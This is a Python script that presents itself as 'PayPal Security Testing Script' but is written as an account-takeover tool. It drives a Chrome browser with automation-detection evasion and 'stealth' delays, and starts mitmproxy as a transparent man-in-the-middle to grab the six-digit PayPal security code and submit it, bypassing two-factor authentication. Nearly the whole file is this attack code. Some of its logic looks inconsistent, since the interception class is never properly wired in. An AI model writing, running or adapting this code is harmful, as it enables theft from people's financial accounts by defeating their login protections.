import time
import random
import json
import subprocess
import imaplib
import email
import pyotp
from getpass import getpass
from email.header import decode_header
from selenium import webdriver
from selenium.webdriver.chrome.service import Service as ChromeService
from selenium.webdriver.chrome.options import Options as ChromeOptions
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from webdriver_manager.chrome import ChromeDriverManager
from mitmproxy import ctx

# ---------- CONFIGURE SMS INTERCEPTION ----------
INTERCEPTED_OTP = None  # Store intercepted OTP

# ---------- STEALTH FUNCTIONS ----------
def stealth_delay():
    time.sleep(random.uniform(2, 5))

# ---------- MITM PROXY TO INTERCEPT OTP ----------
class InterceptPayPalSMS:
    def response(self, flow):
        global INTERCEPTED_OTP
        if "paypal" in flow.request.url and "security_code" in flow.response.text:
            otp_code = extract_otp(flow.response.text)
            if otp_code:
                INTERCEPTED_OTP = otp_code
                print(f"[+] Intercepted PayPal OTP: {otp_code}")

def start_mitmproxy():
    subprocess.Popen(["mitmproxy", "--mode", "transparent", "-s", __file__])

def extract_otp(response_text):
    import re
    match = re.search(r"\b(\d{6})\b", response_text)  # Extract 6-digit OTP
    return match.group(1) if match else None

# ---------- PAYPAL LOGIN WITH OTP INTERCEPTION ----------
def browser_automation_attack(email, password):
    global INTERCEPTED_OTP
    
    options = ChromeOptions()
    options.add_argument("--proxy-server=127.0.0.1:8080")  # Route traffic through MitMproxy
    options.add_argument("--ignore-certificate-errors")
    options.add_argument("--disable-blink-features=AutomationControlled")
    
    driver = webdriver.Chrome(service=ChromeService(ChromeDriverManager().install()), options=options)
    driver.get("https://www.paypal.com/signin")
    stealth_delay()
    
    email_input = driver.find_element(By.NAME, "login_email")
    email_input.send_keys(email)
    stealth_delay()
    
    next_button = driver.find_element(By.ID, "btnNext")
    next_button.click()
    stealth_delay()
    
    password_input = driver.find_element(By.NAME, "login_password")
    password_input.send_keys(password)
    stealth_delay()
    
    login_button = driver.find_element(By.ID, "btnLogin")
    login_button.click()
    stealth_delay()

    # Wait for OTP interception
    print("[*] Waiting for OTP interception...")
    timeout = time.time() + 30  # 30-second timeout
    while time.time() < timeout:
        if INTERCEPTED_OTP:
            break
        time.sleep(2)

    if INTERCEPTED_OTP:
        otp_input = driver.find_element(By.NAME, "security_code")
        otp_input.send_keys(INTERCEPTED_OTP)
        stealth_delay()
        
        otp_submit_button = driver.find_element(By.ID, "securitySubmit")
        otp_submit_button.click()
        stealth_delay()
    else:
        print("[-] OTP interception failed or timed out.")
    
    if "summary" in driver.current_url:
        print("[+] Login successful!")
    else:
        print("[-] Login failed.")

    driver.quit()

# ---------- START SCRIPT ----------
def main():
    print("PayPal Security Testing Script")
    email = input("Enter PayPal email: ")
    password = getpass("Enter PayPal password: ")

    start_mitmproxy()  # Start MitM attack before logging in
    browser_automation_attack(email, password)

if __name__ == "__main__":
    main()
